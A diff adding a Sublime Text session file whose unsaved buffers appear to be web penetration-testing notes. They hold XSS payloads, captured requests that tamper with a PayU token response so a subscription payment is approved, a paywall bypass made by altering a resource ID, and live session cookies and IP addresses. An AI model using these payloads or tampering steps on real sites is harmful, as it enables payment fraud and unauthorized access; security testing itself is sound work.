@@ -1,0 +1,1108 @@
+{
+	"auto_complete":
+	{
+		"selected_items":
+		[
+			[
+				"num",
+				"number"
+			],
+			[
+				"ti",
+				"title\t: DOMString Document"
+			],
+			[
+				"no",
+				"nombre"
+			],
+			[
+				"tiep",
+				"tiempoImp"
+			],
+			[
+				"costo",
+				"costoOperador"
+			],
+			[
+				"tie",
+				"tiempoImp"
+			],
+			[
+				"maqui",
+				"maquinaImp"
+			],
+			[
+				"getA",
+				"getArea"
+			],
+			[
+				"cos",
+				"costoPapel"
+			],
+			[
+				"tipo",
+				"tipoPapel"
+			],
+			[
+				"getC",
+				"getCostoPapel"
+			],
+			[
+				"co",
+				"costo"
+			],
+			[
+				"bind",
+				"bind"
+			],
+			[
+				"th",
+				"this"
+			],
+			[
+				"onC",
+				"onclick\t: EventHandler Document"
+			],
+			[
+				"ur",
+				"url2"
+			],
+			[
+				"re",
+				"respData"
+			],
+			[
+				"da",
+				"data2"
+			],
+			[
+				"ke",
+				"key"
+			],
+			[
+				"k",
+				"key"
+			],
+			[
+				"fo",
+				"for\tFor Loop"
+			],
+			[
+				"su",
+				"sub3"
+			],
+			[
+				"de",
+				"decode"
+			],
+			[
+				"cli",
+				"client_handler"
+			],
+			[
+				"ser",
+				"server_loop"
+			],
+			[
+				"cl",
+				"client_socket"
+			],
+			[
+				"file",
+				"file_descriptor"
+			],
+			[
+				"uplo",
+				"upload_destination"
+			],
+			[
+				"client_",
+				"client_socket"
+			],
+			[
+				"exe",
+				"execute"
+			],
+			[
+				"o",
+				"output"
+			],
+			[
+				"s",
+				"subprocess"
+			],
+			[
+				"try",
+				"try\tTry/Except"
+			],
+			[
+				"A",
+				"AF_INET"
+			],
+			[
+				"rec",
+				"recv_len"
+			],
+			[
+				"if",
+				"if\tIf Condition"
+			],
+			[
+				"com",
+				"command"
+			],
+			[
+				"coma",
+				"commandshell"
+			],
+			[
+				"e",
+				"execute"
+			],
+			[
+				"u",
+				"usage"
+			],
+			[
+				"bin",
+				"bind_port"
+			],
+			[
+				"tar",
+				"target_port"
+			],
+			[
+				"PRO",
+				"prompt\t( message?: DOMString, default?: DOMString ): DOMString Window"
+			],
+			[
+				"CONS",
+				"console.log();"
+			],
+			[
+				"getE",
+				"getElementById\t( elementId: DOMString ): Element Document"
+			],
+			[
+				"fun",
+				"function_with_name"
+			],
+			[
+				"new",
+				"newLocation"
+			],
+			[
+				"por",
+				"porcentageCompleto"
+			],
+			[
+				"pro",
+				"process.abort();"
+			],
+			[
+				"for",
+				"form"
+			],
+			[
+				"req",
+				"require"
+			],
+			[
+				"fore",
+				"forEach\t( callbackfn: Function, thisArg?: any ): Array Array"
+			],
+			[
+				"console",
+				"console_log"
+			],
+			[
+				"pros",
+				"process"
+			],
+			[
+				"qu",
+				"question"
+			],
+			[
+				"call",
+				"callback"
+			],
+			[
+				"ass",
+				"assets"
+			],
+			[
+				"buf",
+				"buf2"
+			],
+			[
+				"le",
+				"length\t: int Array"
+			],
+			[
+				"bu",
+				"buf2"
+			],
+			[
+				"user",
+				"userData"
+			],
+			[
+				"conso",
+				"console_log"
+			],
+			[
+				"cons",
+				"console_log"
+			],
+			[
+				"use",
+				"userData"
+			],
+			[
+				"em",
+				"email"
+			],
+			[
+				"me",
+				"methods"
+			],
+			[
+				"pass",
+				"password"
+			],
+			[
+				"c",
+				"Column"
+			],
+			[
+				"ide",
+				"index"
+			],
+			[
+				"Contac",
+				"Contact"
+			],
+			[
+				"cla",
+				"className\t: DOMString Element"
+			],
+			[
+				"App",
+				"AppRoutes"
+			],
+			[
+				"comp",
+				"components"
+			],
+			[
+				"resul",
+				"result"
+			],
+			[
+				"nu",
+				"number2"
+			],
+			[
+				"nume",
+				"number2"
+			],
+			[
+				"numer",
+				"number1"
+			],
+			[
+				"in",
+				"input"
+			],
+			[
+				"setst",
+				"setState"
+			],
+			[
+				"els",
+				"else_if"
+			],
+			[
+				"setS",
+				"setState"
+			],
+			[
+				"sate",
+				"state\tReact: this.state"
+			],
+			[
+				"handle",
+				"handleCountClick"
+			],
+			[
+				"onc",
+				"onclick\t: EventHandler Document"
+			],
+			[
+				"strin",
+				"String\t( value: any ): String String"
+			],
+			[
+				"ite",
+				"items\t: DataTransferItemList DataTransfer"
+			],
+			[
+				"lin",
+				"links\t: HTMLCollection Document"
+			],
+			[
+				"set",
+				"setTimeout\t( handler: any, timeout?: long, arguments_..: any ): long Window"
+			],
+			[
+				"fil",
+				"filterList"
+			],
+			[
+				"ine",
+				"indexOf\t( searchElement: any, fromIndex?: int ): int Array"
+			],
+			[
+				"el",
+				"else_if"
+			],
+			[
+				"pr",
+				"product"
+			],
+			[
+				"forEa",
+				"description-forEach\tArray"
+			],
+			[
+				"ca",
+				"category"
+			],
+			[
+				"las",
+				"last_category"
+			],
+			[
+				"web",
+				"webpack-dev-server"
+			],
+			[
+				"Re",
+				"ReactDOM"
+			],
+			[
+				"a",
+				"arg"
+			],
+			[
+				"se",
+				"second"
+			]
+		]
+	},
+	"buffers":
+	[
+		{
+			"contents": "&lt; \n181.61.44.133\n\nhttps://terpel.isoco.com\n\n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",
+			"settings":
+			{
+				"buffer_size": 2177,
+				"line_ending": "Unix",
+				"name": "&lt;"
+			}
+		},
+		{
+			"contents": "%uff1cscript%uff1ealert(360);%uff1c/script%uff1e\n<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>\n\n\nhttps://webservice-pruebas.yanbalcolombia.com/FrontEndDataCreditoAjustesCORP\n\n['', '/usr/local/lib/python36.zip', '/usr/local/lib/python3.6', '/usr/local/lib/python3.6/lib-dynload', '/root/.local/lib/python3.6/site-packages', '/usr/local/lib/python3.6/site-packages', '/usr/local/lib/python3.6/site-packages/jwt-0.5.2-py3.6.egg', '/usr/local/lib/python3.6/site-packages/cryptography-1.9-py3.6-linux-x86_64.egg']\n\n\n\n\ncccc\nfrom Crypto.Hash import HMAC\nfrom Crypto.Hash import SHA256\n\n\n190.216.130.99\n\n\n\n\n\nBody\tformData[names]\tAPPROVsasdED\nBody\tformData[number]\t************1111\nBody\tformData[exp_month]\t4\nBody\tformData[exp_year]\t2018\nBody\tformData[cvc]\t**1\nBody\tformData[paymentMethod]\tVISA\nBody\tformData[token]\te8526400-d17b-4e5f-a0d9-9d21aff620ea\nBody\tformData[payer_id]\t43534243\nBody\tformData[uq_id]\tacd9e45dea7a7bd03819b2e452cb1eb01e611cb19c367ed124e1aff93daea3b5\nBody\tformData[installments]\t1\nBody\tformData[tipo_doc]\tCC\nBody\tformData[document]\t43534243\nBody\tformData[info_doc_payer]\t43534243\nBody\tformData[tipo_doc_payer]\tCC\nBody\tformData[info_mail_payer]\ttest7@360sec.com\nBody\tformData[id_dep]\t08\nBody\tformData[nombre_dep]\tATLANTICO\nBody\tformData[id_ciudad]\t00008638\nBody\tformData[nombre_ciudad]\tSABANALARGA\nBody\tformData[direccion]\tcalle 33\nBody\tformData[adicional_dir]\ttest\nBody\tformData[celular_buyer]\t3333333333\nBody\tformData[valor_iva]\t0\nBody\tformData[base_gravable]\t0\n",
+			"settings":
+			{
+				"buffer_size": 1480,
+				"line_ending": "Unix",
+				"name": "%uff1cscript%uff1ealert(360);%uff1c/script%uff1e"
+			}
+		},
+		{
+			"file": "/root/Documents/pythonAcademy/scrapyexample.py",
+			"settings":
+			{
+				"buffer_size": 142,
+				"encoding": "UTF-8",
+				"line_ending": "Unix",
+				"name": "s"
+			}
+		},
+		{
+			"contents": "precios por ciudad\n\nid_ciudad=00005088&key_product=4d4f66390fddf7a0591225f8a4db728a\n{\"response\":{\"status\":true,\"valorNeto\":\"$ 10.000\",\"valorBase\":\"$ 10.000\",\"valorIva\":\"$ 0\",\"key_product\":\"465567185c3751e03c677f0506d7eca6\"}}\n\n-----\nid_ciudad=00005129&key_product=4d4f66390fddf7a0591225f8a4db728a\n{\"response\":{\"status\":true,\"valorNeto\":\"$ 10.000\",\"valorBase\":\"$ 10.000\",\"valorIva\":\"$ 0\",\"key_product\":\"465567185c3751e03c677f0506d7eca6\"}}\n----\nid_ciudad=00005154&key_product=4d4f66390fddf7a0591225f8a4db728a\n{\"response\":{\"status\":true,\"valorNeto\":\"$ 10.000\",\"valorBase\":\"$ 10.000\",\"valorIva\":\"$ 0\",\"key_product\":\"27db717d5241d9920242c785476cf898\"}}\n----\nid_ciudad=00005212&key_product=4d4f66390fddf7a0591225f8a4db728a\n{\"response\":{\"status\":true,\"valorNeto\":\"$ 10.000\",\"valorBase\":\"$ 10.000\",\"valorIva\":\"$ 0\",\"key_product\":\"465567185c3751e03c677f0506d7eca6\"}}\n------\n\n\n\njQuery183024444856145086757_1520864948862({token:'5a284751-72ba-40a8-9a82-9eaf60fc9e28', name:'APPROVED', payer_id:'123456', method:'VISA', document:'null'})\n\n\njQuery18309409761724844234_1520870797161([{id:10, name:'VISA'},{id:252, name:'AMEX'},{id:25, name:'PSE'},{id:253, name:'DINERS'},{id:11, name:'MASTERCARD'},])\n\n\njQuery18309409761724844234_1520870797161({token:'a4f27b3f-ef9b-4c31-9cd3-cbdc46512660', name:'APPROVED', payer_id:'1234566', method:'VISA', document:'null'})",
+			"settings":
+			{
+				"buffer_size": 1345,
+				"line_ending": "Unix",
+				"name": "precios por ciudad"
+			}
+		},
+		{
+			"contents": "cadf40e5-6f40-4160-a79d-498041b2dd41\n\n\nPETICIÓN (payu)\n\nGET /payments-api/4.0/service.token?callback=jQuery18305455041843485405_1521049218709&public_key=PKcR649eR9F6Mf3i954G4i8Q2U&account_id=500713&list_id=mylistID&_card%5Bnumber%5D=4111111111111111&_card%5Bname_card%5D=APPROVED&_card%5Bexp_month%5D=04&_card%5Bexp_year%5D=2018&_card%5Bpayer_id%5D=77777777&_card%5Buq_id%5D=03ceb808c4aeadbfc2324e4365643a14634cfeb4c27a8a8d35516362ada37afd&_card%5Bsub_domain_url%5D=https%3A%2F%2Fseg.eltiempobeta.com&_card%5Bcvc%5D=321&_card%5Bmethod%5D=VISA&_=1521049730641 HTTP/1.1\nHost: sandbox.api.payulatam.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://seg.eltiempobeta.com/pago/suscripcion-digital\nCookie: _ga=GA1.2.714002192.1520547818\nConnection: close\n\nRESPUESTA(payu)\n\nHTTP/1.1 200 OK\nX-Frame-Options: sameorigin\nContent-Type: application/json;charset=ISO-8859-1\nContent-Length: 158\nDate: Wed, 14 Mar 2018 17:48:54 GMT\nConnection: close\nServer: PayU server\n\njQuery18305455041843485405_1521049218709({token:'fb3427e0-3a07-4c95-a787-29ec00890d46', name:'APPROVED', payer_id:'77777777', method:'VISA', document:'null'})\n\nRESPUESTA (payU Modificada)\n\nHTTP/1.1 200 OK\nX-Frame-Options: sameorigin\nContent-Type: application/json;charset=ISO-8859-1\nContent-Length: 158\nDate: Wed, 14 Mar 2018 17:48:54 GMT\nConnection: close\nServer: PayU server\n\njQuery18305455041843485405_1521049218709({token:'cadf40e5-6f40-4160-a79d-498041b2dd41', name:'APPROVED', payer_id:'77777777', method:'VISA', document:'null'})\n\n\nPETICIÓN (tiempo transaction)\n\nPOST /payment/suscripcion-digital/transaction HTTP/1.1\nHost: seg.eltiempobeta.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://seg.eltiempobeta.com/pago/suscripcion-digital\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 1085\nCookie: s_cc=true; s_dslv=1521049222857; s_nr=1521049222863-Repeat; s_cc=true; s_fid=378113F33D3DA79C-2746A82C0A866A7A; s_sq=eltiempoetpruebaspaywall%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fseg.eltiempobeta.com%25252Fbetaetxalok%25252Fuser-area%25252Fsubscriber%2526link%253Dhttp%25253A%25252F%25252Fbeta.eltiempo.com%25252Fuploads%25252F2017%25252F09%25252F21%25252F59c3fdb52d11d.jpeg%2526region%253Dseg-container-suscriber%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fseg.eltiempobeta.com%25252Fbetaetxalok%25252Fuser-area%25252Fsubscriber%2526oid%253Dfunctiononclick%252528event%252529%25257BactualizaRevista%252528%252527MOTOR682%252527%25252C%252527test%252540360sec.com%252527%25252C%252527leida_0%252527%252529%25253BabrirEnlace%252528%252527http%25253A%25252F%25252F%2526oidt%253D2%2526ot%253DA%26eltiemposuscripcionespaywallpruebas%3D%2526c.%2526a.%2526activitymap.%2526page%253DSEG%25253Apago%25253Asuscripcion-digital%2526link%253DPAGAR%252520%252524240.000%2526region%253Dformularios_compra%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253DSEG%25253Apago%25253Asuscripcion-digital%2526pidt%253D1%2526oid%253Dfunctiononclick%252528event%252529%25257BpaymentFormValidation.envioDatos%252528%252527f66867da307192f8a1569ce0328fbb73a9461fb7%252527%25252C%252527%2526oidt%253D2%2526ot%253DBUTTON; s_fid=378113F33D3DA79C-2746A82C0A866A7A; sso_session_beta=orjv0ji3kspnup6vvqagcsib5fpa0623; s_sq=eltiemposuscripcionespaywallpruebas%3D%2526c.%2526a.%2526activitymap.%2526page%253DSEG%25253Apago%25253Asuscripcion-digital%2526link%253DPAGAR%252520%25252420.000%2526region%253Dformularios_compra%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253DSEG%25253Apago%25253Asuscripcion-digital%2526pidt%253D1%2526oid%253Dfunctiononclick%252528event%252529%25257BpaymentFormValidation.envioDatos%252528%252527f66867da307192f8a1569ce0328fbb73a9461fb7%252527%25252C%252527%2526oidt%253D2%2526ot%253DBUTTON%26eltiempoetpruebaspaywall%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fseg.eltiempobeta.com%25252Fbetaetxalok%25252Fuser-area%25252Fsubscriber%2526link%253Dhttp%25253A%25252F%25252Fbeta.eltiempo.com%25252Fuploads%25252F2017%25252F09%25252F21%25252F59c3fdb52d11d.jpeg%2526region%253Dseg-container-suscriber%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fseg.eltiempobeta.com%25252Fbetaetxalok%25252Fuser-area%25252Fsubscriber%2526oid%253Dfunctiononclick%252528event%252529%25257BactualizaRevista%252528%252527MOTOR682%252527%25252C%252527test%252540360sec.com%252527%25252C%252527leida_0%252527%252529%25253BabrirEnlace%252528%252527http%25253A%25252F%25252F%2526oidt%253D2%2526ot%253DA; s_dslv_s=Less%20than%201%20day\nConnection: close\n\nformData%5Bnames%5D=APPROVED&formData%5Bnumber%5D=************1111&formData%5Bexp_month%5D=4&formData%5Bexp_year%5D=2018&formData%5Bcvc%5D=**1&formData%5BpaymentMethod%5D=VISA&formData%5Btoken%5D=cadf40e5-6f40-4160-a79d-498041b2dd41&formData%5Bpayer_id%5D=77777777&formData%5Buq_id%5D=03ceb808c4aeadbfc2324e4365643a14634cfeb4c27a8a8d35516362ada37afd&formData%5Binstallments%5D=1&formData%5Btipo_doc%5D=CC&formData%5Bdocument%5D=77777777&formData%5Binfo_doc_payer%5D=77777777&formData%5Btipo_doc_payer%5D=CC&formData%5Binfo_mail_payer%5D=test%40360sec.com&formData%5Bnombre_dep%5D=&formData%5Bnombre_ciudad%5D=&formData%5Bcelular_buyer%5D=3333333333&formData%5Bvalor_iva%5D=0&formData%5Bbase_gravable%5D=0&formData%5Brenovacion%5D=0&formData%5Bsuscripcion%5D=&formData%5Bposex%5D=&formData%5Bposnormal%5D=&formData%5Bcyclenr%5D=&formData%5Bvbeln%5D=&formData%5Bposnr%5D=&formData%5Bcode_tp_product%5D=DIG&formData%5Bdevice_session_id%5D=2d978d9cb5d052b5c3f4d0b78bb69d92&formData%5Bid_pais%5D=&formData%5Bnombre_pais%5D=Pa%C3%ADs&formData%5Bkeyproduct%5D=ab91ecae1f01cc70c2961066d59fec87\n\n\nRESPUESTA (transaction)\n\nHTTP/1.1 200 OK\nServer: nginx/1.12.1\nDate: Wed, 14 Mar 2018 17:49:04 GMT\nContent-Type: application/json; charset=utf-8\nConnection: keep-alive\nX-Powered-By: PHP/5.6.31\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nAccess-Control-Allow-Headers: Content-Type,Accept\nX-Server: set1\nContent-Length: 531\n\n\n{\"response\":{\"principal\":\"Solicitud procesada.\",\"view\":\"APPROVED\",\"secundario\":\"La transacci\\u00f3n se ha realizado exitosamente.\",\"subdomainUrl\":\"http:\\/\\/beta.eltiempo.com\",\"ventaView\":{\"descripcion\":\"EL TIEMPO DIGITAL\",\"fechaCobro\":\"Marzo 14, 2018\",\"referencia\":\"PW-1037\",\"valor\":\"20,000\",\"tarjeta\":\"************1111\",\"direccion\":\"CL DIGITAL 0\",\"ciudad\":\"\",\"nombre\":\"APPROVED\",\"departamento\":\"\",\"complemento\":\"\",\"telefono\":\"3333333333\",\"datos_demo_val\":{\"direccion\":false,\"direccion_info\":\"CL DIGITAL 0\",\"franquicia\":\"VISA\"}}}}",
+			"settings":
+			{
+				"buffer_size": 6986,
+				"line_ending": "Unix",
+				"name": "cadf40e5-6f40-4160-a79d-498041b2dd41"
+			}
+		},
+		{
+			"contents": "http://beta.eltiempo.com/politica/proceso-de-paz/destacan-papel-de-la-mujer-para-consolidar-el-posconflicto-156480",
+			"settings":
+			{
+				"buffer_size": 114,
+				"line_ending": "Unix"
+			}
+		},
+		{
+			"contents": "Peticion original\n\nGET /paywall/newmeter/betaetxalok?callback=jQuery19108471357177929288_1521559091635&idRecurso=160023&originalSession=5aabe95de4b0cccaa24f61f5&referer=http%3A%2F%2Fbeta.eltiempo.com%2Fdeportes%2Ffutbol-internacional&ipaddress=&_=1521559091636 HTTP/1.1\nHost: seg.eltiempobeta.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: http://beta.eltiempo.com/deportes/futbol-internacional/tras-22-dias-de-para-por-una-lesion-viajo-a-turquia-con-bayern-munich-para-enfrentar-a-besiktas-160023\nCookie: sso_session_beta=o3brue12p7bbc44msht0lpaoubgg0ge8\nDNT: 1\nConnection: close\n\nPeticion Modificado\n\n----\n\nGET /paywall/newmeter/betaetxalok?callback=jQuery19108471357177929288_1521559091635&idRecurso=156480&originalSession=5aabe95de4b0cccaa24f61f5&referer=http%3A%2F%2Fbeta.eltiempo.com%2Fdeportes%2Ffutbol-internacional&ipaddress=&_=1521559091636 HTTP/1.1\nHost: seg.eltiempobeta.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: http://beta.eltiempo.com/deportes/futbol-internacional/tras-22-dias-de-para-por-una-lesion-viajo-a-turquia-con-bayern-munich-para-enfrentar-a-besiktas-160023\nCookie: sso_session_beta=o3brue12p7bbc44msht0lpaoubgg0ge8\nDNT: 1\nConnection: close\n\nRespuesta Modificada\n\n----\n\nHTTP/1.1 200 OK\nServer: nginx/1.12.1\nDate: Tue, 20 Mar 2018 15:19:02 GMT\nContent-Type: application/json\nConnection: keep-alive\nX-Powered-By: PHP/5.6.31\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nAccess-Control-Allow-Origin: http://beta.eltiempo.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Headers: Content-Type,Accept\nX-Server: set1\nContent-Length: 474\n\njQuery19108471357177929288_1521559091635(\"{\\\"actions\\\":{\\\"action\\\":\\\"ALLOW_ACCESS\\\"},\\\"metadata\\\":{\\\"parameter\\\":[{\\\"name\\\":\\\"session_id\\\",\\\"value\\\":\\\"5aabe95de4b0cccaa24f61f5\\\"},{\\\"name\\\":\\\"session_expiry_seconds\\\",\\\"value\\\":0},{\\\"name\\\":\\\"meter_viewed_count\\\",\\\"value\\\":\\\"20\\\"},{\\\"name\\\":\\\"meter_updated\\\",\\\"value\\\":\\\"true\\\"}]},\\\"statusResponse\\\":200,\\\"elapsedTime\\\":\\\"0.1419\\\",\\\"timestamp\\\":1521559142,\\\"et\\\":\\\"8b51cd33b531d9c9d0250c3df9c3c6c98e31d182\\\",\\\"max\\\":\\\"20\\\"}\")\n\nPeticion original\n\n--\n\nGET /paywall/newmeter/betaetxalok?callback=jQuery19103922134469636246_1521558955351&idRecurso=160023&originalSession=5aabe95de4b0cccaa24f61f5&referer=http%3A%2F%2Fbeta.eltiempo.com%2Fdeportes%2Ffutbol-internacional&ipaddress=&_=1521558955352 HTTP/1.1\nHost: seg.eltiempobeta.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: http://beta.eltiempo.com/deportes/futbol-internacional/tras-22-dias-de-para-por-una-lesion-viajo-a-turquia-con-bayern-munich-para-enfrentar-a-besiktas-160023\nCookie: sso_session_beta=o3brue12p7bbc44msht0lpaoubgg0ge8\nDNT: 1\nConnection: close\n\nRespuesta Original\n\n-----\n\nHTTP/1.1 200 OK\nServer: nginx/1.12.1\nDate: Tue, 20 Mar 2018 15:16:04 GMT\nContent-Type: application/json\nConnection: keep-alive\nX-Powered-By: PHP/5.6.31\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nAccess-Control-Allow-Origin: http://beta.eltiempo.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Headers: Content-Type,Accept\nX-Server: set1\nContent-Length: 481\n\njQuery19103922134469636246_1521558955351(\"{\\\"actions\\\":{\\\"action\\\":\\\"REQUIRE_ENTITLEMENT\\\"},\\\"metadata\\\":{\\\"parameter\\\":[{\\\"name\\\":\\\"session_id\\\",\\\"value\\\":\\\"5aabe95de4b0cccaa24f61f5\\\"},{\\\"name\\\":\\\"session_expiry_seconds\\\",\\\"value\\\":0},{\\\"name\\\":\\\"meter_viewed_count\\\",\\\"value\\\":\\\"20\\\"},{\\\"name\\\":\\\"meter_updated\\\",\\\"value\\\":\\\"true\\\"}]},\\\"statusResponse\\\":200,\\\"elapsedTime\\\":\\\"0.1410\\\",\\\"timestamp\\\":1521558964,\\\"et\\\":\\\"8b51cd33b531d9c9d0250c3df9c3c6c98e31d182\\\",\\\"max\\\":\\\"20\\\"}\")",
+			"settings":
+			{
+				"buffer_size": 4171,
+				"line_ending": "Unix",
+				"name": "Peticion original"
+			}
+		},
+		{
+			"contents": "# ruby -run -e httpd . -p 9090\n\n title: \"Welcome\",\n      value: 'Please write an essay about your favorite DOM element.',\n      nombre: '',\n      apellido: '',\n      email:'',\n      numTintas:0,\n      ancho:0,\n      largo:0,\n      tipoImp:'0',\n      tipoPapel:'0',\n      maquinaImp:'0',\n      pDesperdicioPapel:0.0,\n      pUtilidad:0.0,\n      numEtiquetas:0,\n      valueMaquinaImp:[[10,2000,5],[6,1000,10],[2,100,20]],\n      'costo':0,\n      'costoTotal':0\n\n\n\n      <div class=\"row\">\n      <div class=\"col-md-6\">\n        <form onSubmit={this.handleSubmit.bind(this)} >\n          <div class=\"col-md-3\">\n              <div class=\"form-group\">\n                <label for=\"nombre\"> Nombres</label>\n                <input type=\"text\" class=\"form-control\" name=\"nombre\" onChange={this.handleInputChange.bind(this)}/>\n              </div>\n              <div class=\"form-group\">\n                <label for=\"apellido\"> Apellidos</label>\n                <input type=\"text\" class=\"form-control\"  name=\"apellido\" onChange={this.handleInputChange.bind(this)}/>\n              </div>\n              <div class=\"form-group\">\n                <label for=\"email\">Correo Electronico:</label>\n                <input type=\"email\" class=\"form-control\" name=\"email\" onChange={this.handleInputChange.bind(this)}/>\n              </div>\n\n            {/*Cotización*/}\n\n            <div class=\"form-group\">\n                <label for=\"numTintas\"> Cantidad de Tintas</label>\n                <input type=\"text\" class=\"form-control\" name=\"numTintas\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"ancho\"> Ancho</label>\n                <input type=\"text\" class=\"form-control\" name=\"ancho\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"largo\"> Largo</label>\n                <input type=\"text\" class=\"form-control\" name=\"largo\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n\n          </div>\n          <div class=\"col-md-3\">\n\n            <div class=\"form-group\">\n                <label for=\"tipoImp\"> Tipo de Impresion</label>\n                <select name=\"tipoImp\" value={this.state.value} onChange={this.handleChange.bind(this)}>\n                  <option value=\"0\">digital</option>\n                  <option value=\"1\">flexográfica</option>\n                  <option value=\"2\">formas continuas</option>\n              </select>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"tipoPapel\"> Tipo de papel</label>\n                